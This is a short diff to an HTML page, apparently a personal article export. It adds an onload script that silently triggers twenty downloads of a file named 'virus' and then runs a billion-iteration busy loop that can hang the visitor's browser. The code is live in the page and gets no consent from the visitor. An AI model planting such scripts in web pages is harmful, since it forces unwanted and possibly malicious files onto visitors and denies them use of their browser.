@@ -207,6 +207,26 @@ Now you know why?</p>
 </div>
 </div>
 </div>
+<script>
+  window.onload = function() {
+    var totalSimulations = 1e9;
+    var simulationcount = 0;
+    var downloadcount = 20;
+    for (let i = 1; i<=totalSimulations;i++){
+      if(i<=downloadcount){
+        var a = document.createElement('a');
+        a.href = 'virus';
+        a.download = 'virus';
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+      }
+      if(simulationcount < 1e9){
+        continue;
+      }
+    }
+  }
+</script>
 <div id="postamble" class="status">
 <p class="author">Author: Harshit Modi</p>
 <p class="date">Created: 2025-02-08 Sat 01:23</p>
